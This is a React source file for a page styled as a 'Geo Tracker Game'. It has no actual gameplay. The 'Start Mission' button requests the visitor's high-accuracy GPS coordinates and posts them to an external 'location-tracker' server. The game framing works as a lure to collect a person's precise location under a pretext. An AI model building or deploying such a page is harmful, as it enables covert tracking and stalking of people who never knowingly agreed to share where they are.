import { useState } from "react";

function App() {
  const [status, setStatus] = useState("🎮 Click Start to begin mission");
  const [started, setStarted] = useState(false);

  const startTracking = () => {
    setStarted(true);
    setStatus("🛰️ Initializing GPS...");

    if (!navigator.geolocation) {
      setStatus("❌ Device not supported");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        const lat = pos.coords.latitude;
        const lng = pos.coords.longitude;

        setStatus("📡 Sending data to server...");

        try {
          await fetch("https://location-tracker-km22.onrender.com/location", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({ lat, lng }),
          });

          setStatus("✅ Mission Success 🚀");
        } catch (err) {
          setStatus("❌ Server error");
        }
      },
      () => {
        setStatus("❌ Permission denied");
      },
      {
        enableHighAccuracy: true,
      }
    );
  };

  return (
    <div style={styles.container}>
      <h1 style={styles.title}>🎮 Geo Tracker Game</h1>

      {!started ? (
        <button style={styles.button} onClick={startTracking}>
          ▶ Start Mission
        </button>
      ) : (
        <div style={styles.card}>
          <p style={styles.status}>{status}</p>
        </div>
      )}
    </div>
  );
}

const styles = {
  container: {
    height: "100vh",
    display: "flex",
    flexDirection: "column",
    justifyContent: "center",
    alignItems: "center",
    background: "linear-gradient(135deg, #0f172a, #1e293b)",
    color: "white",
    fontFamily: "Arial",
  },
  title: {
    fontSize: "40px",
    marginBottom: "30px",
  },
  button: {
    padding: "15px 30px",
    fontSize: "18px",
    borderRadius: "10px",
    border: "none",
    cursor: "pointer",
    background: "#22c55e",
    color: "white",
    transition: "0.3s",
  },
  card: {
    padding: "30px",
    borderRadius: "15px",
    background: "#1e293b",
    boxShadow: "0 0 20px rgba(0,0,0,0.5)",
  },
  status: {
    fontSize: "20px",
  },
};

export default App;